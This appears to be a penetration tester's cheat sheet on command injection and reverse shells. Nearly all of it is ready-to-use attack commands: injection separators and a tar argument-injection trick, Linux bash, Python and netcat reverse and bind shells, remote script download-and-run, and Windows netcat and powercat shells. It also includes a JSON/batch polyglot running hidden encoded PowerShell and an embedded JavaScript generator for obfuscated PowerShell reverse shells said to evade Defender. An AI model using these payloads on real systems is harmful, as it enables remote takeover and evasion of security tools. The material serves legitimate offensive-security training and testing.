---
layout: blank
pagetitle: Command Injection & Reverse Shells
---

## Command Injection
- It's pretty self-explanatory

**Common ways of injecting commands**
- Classic `;id`, `| id`, `&& id`
- Newlines can be a pretty sneaky way of getting around a blacklist if the shell is invoked
  - `asdf %0A id`

**Argument injection**
- Little bit more fancy, useful if the shell isn't being invoked
- [GTFOBins](https://gtfobins.github.io/) comes in really handy here
- Example: let's say we have argument injection on `tar`
  - We can see that `tar` has `--checkpoint=1 --checkpoint-action=exec={command}` on GTFOBins
  - Thus, we don't actually even need a shell for command execution, we can simply fork a process running our commands from tar
    - This could look something like `--checkpoint=1 --checkpoint-action=exec=perl$IFS-e$IFS'system(join($x,map(chr,({decimal_characters_to_run}))))';`

**Reviewing Source Code**
- Review the source code, track functions with execution, which may be nested multiple times inside of other functions
  - C/C++: `system, exec(ve), CreateProcess, popen, fork...  `
  - Python: `subprocess.run/popen/call/etc., os.system/popen...`
  - Java: `runtime.GetRuntime.exec, ProcessBuilder.start...`
  - PHP: `system, exec, shell_exec, popen, proc_open...`
  - Go: `os/exec.Command, Cmd.Run/Output...`
  - Rust: `std::process::Command::new/spawn/output`
- Good candidates will often stand out
  - Filesystem operations (file read/writes, compression, USB I/O)
  - Database operations (Kiosks can have SQL injection too!)
  - Network configuration (good ol' ping)
- Then trace what functions you can hit from GUI/app

## Upgrading Command Injection to a Shell

- Make sure to set your listener first with `nc -lnvp {port}`
  - On mac, can just do `nc -l {port}`, though the firewall might have to be disabled

**Resources**
- A good resource here is: [Revshells](https://www.revshells.com/)
  - Can set the IP/port, and it will dynamically generate the payload

**Linux Bind Shells**
- Socat seems to be pretty solid: `socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`
  - Then, on attacker machine: ``socat FILE:`tty`,raw,echo=0 TCP:target.com:{port}``
- Python: `python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'`
- NC: `nc -nlvp {port} -e /bin/bash`

**Linux Reverse shells**
- `bash -i >& /dev/tcp/{IP}/{port} 0>&1`
- `busybox nc {IP} {port} -e sh` or `busybox nc {IP} {port} -e /bin/sh`
- `python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`
- If we're restricted in characters, the best way to usually do it is to get a script on the system, and execute that
  - `wget {IP}:{port}/script.sh` -> `chmod 777 ./script.sh` -> `./script.sh`

**Making our revshell an MCP**
- Use Francisco's [agent2shell](https://github.com/0xmagic0/agent2shell), which sets up a binary that essentially catches the shell and allows anything to send commands to it
  - `make build`, then add to PATH for easy usage 
  - Catch shell with `agent2shell catch -p 4444`, then send commands with `agent2shell run '{command}'`

**Upgrading Linux Shell to a Better Shell**
- `script /dev/null -c bash`
  - Then background the existing shell with CTRL Z
  - Then on kali: `stty raw -echo; fg` (to continue the process)
  - Finally type `reset` then set the terminal type to `screen`
- Alternatively try one of these:

```sh 
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'
```

**Polyglot Payloads**
- Sometimes, you need to format a payload into a different valid filetype
- `.bat` files are excellent for this, as they'll basically parse through garbage to find executable things to run
  - For example, if we had to do JSON: `{"x\"& powershell -w hidden -exec bypass -enc {base64} & exit &\"x":"1"}` is valid JSON

**Windows Reverse Shells**
- Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
  - Then run `C:\Windows\Temp\nc.exe -e powershell.exe {IP} {port}` for a Powershell reverse shell
- [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) is a robust Windows reverse shell
  - Invoked with `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c {IP} -p {port} -e powershell`
  - Very signatured, will trigger EDR
- Can also just do it with powershell alone - use the below to generate an obfuscated payload (doesn't trip Defender, as of writing):
  - If you don't want the command window hanging around for whatever reason, the output can be adapted like so: 
    - `if not defined _Z (set _Z=1&start /min cmd /c %~f0&exit) else (powershell -w hidden -exec bypass -enc BASE64HERE &exit)`
      - This will set `_Z=1` on the first run, relaunch the same script minimized, and exit the visible window since `_Z` is now defined
      - Much faster than simply starting the window minimized

**Windows Revshell Generator**
{% raw %}
<input id="rs-ip" placeholder="IP" value="10.10.10.10" size="15" style="font:inherit;padding:1px 5px;border:1px solid #e8e8e8;border-radius:3px"> <input id="rs-port" placeholder="Port" value="4444" size="6" style="font:inherit;padding:1px 5px;border:1px solid #e8e8e8;border-radius:3px"> <button onclick="genRS()" style="font:inherit;padding:1px 8px;border:1px solid #e8e8e8;border-radius:3px;cursor:pointer">Generate</button> <button onclick="navigator.clipboard.writeText(document.getElementById('rs-out').textContent)" style="font:inherit;padding:1px 8px;border:1px solid #e8e8e8;border-radius:3px;cursor:pointer">Copy</button>
<pre id="rs-out" style="white-space:pre-wrap;word-break:break-all;display:none"></pre>
<script>
function genRS(){
  const UNSAFE=new Set('ntrabfv0'),
    words='initialize setup config validate check process handler module service update refresh sync load parse format convert buffer cache registry session context dispatch render'.split(' '),
    az='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',an=az+'0123456789',
    ri=()=>''+((Math.random()*999899|0)+100),
    rn=(n,c)=>{let s='';for(let i=0;i<n;i++)s+=c[Math.random()*c.length|0];return s},
    rv=()=>'$'+rn(6+Math.random()*7|0,az),rs=()=>rn(8+Math.random()*13|0,an),
    rw=()=>words[Math.random()*words.length|0];
  function bt(cmd){return cmd.split('-').map(p=>{
    let sp=[];for(let i=1;i<p.length;i++)if(!UNSAFE.has(p[i].toLowerCase()))sp.push(i);
    if(sp.length){let i=sp[Math.random()*sp.length|0];p=p.slice(0,i)+'`'+p.slice(i)}return p;
  }).join('-')}
  function ss(s){let m=2+Math.random()*(s.length-4)|0;return`('${s.slice(0,m)}'+'${s.slice(m)}')`}
  const jt=[()=>`${rv()} = ${ri()}`,()=>`${rv()} = '${rs()}'`,()=>`if ($false) { ${rv()} = ${ri()} }`,
    ()=>`# ${rw()} ${rw()} ${rs()}`,()=>`function ${rs()} { return ${ri()} }`,
    ()=>`${rv()} = [int](${ri()}) + [int](${ri()})`];
  function jl(n){n=n||(1+Math.random()*3|0);return Array.from({length:n},()=>jt[Math.random()*jt.length|0]()).join('\n')}
  const ip=document.getElementById('rs-ip').value,port=document.getElementById('rs-port').value,
    [vc,vs,vb,vr,vd,vx,ve,vt]=[rv(),rv(),rv(),rv(),rv(),rv(),rv(),rv()],
    cm=`# ${rw()} ${rw()} ${rs()}`;
  const payload=`${jl(3)}\n${vt} = ${ss('System.Net.Sockets.TCPClient')}\n${jl(2)}\n${vc} = ${bt('New-Object')} ${vt} ('${ip}',${port})\n${jl(1)}\n${vs} = ${vc}.GetStream()\n[byte[]]${vb} = 0..65535|%{0}\n${jl(2)}\nwhile((${vr} = ${vs}.Read(${vb}, 0, ${vb}.Length)) -ne 0){\n    ${cm}\n    ${ve} = ${bt('New-Object')} -TypeName ${ss('System.Text.ASCIIEncoding')}\n    ${vd} = ${ve}.GetString(${vb},0, ${vr})\n    ${jl(1)}\n    ${vx} = (& ([scriptblock]::Create(${vd})) 2>&1 | ${bt('Out-String')} )\n    ${vx} = ([text.encoding]::ASCII).GetBytes(${vx} + 'ps> ')\n    ${vs}.Write(${vx},0,${vx}.Length)\n    ${vs}.Flush()\n    ${jl(1)}\n}\n${jl(2)}\n${vc}.Close()\n`;
  const u16=new Uint8Array(payload.length*2);
  for(let i=0;i<payload.length;i++){const c=payload.charCodeAt(i);u16[i*2]=c&0xff;u16[i*2+1]=c>>8}
  const out=document.getElementById('rs-out');out.style.display='block';out.textContent='powershell -exec bypass -enc '+btoa(String.fromCharCode(...u16));
}
</script>
{% endraw %}




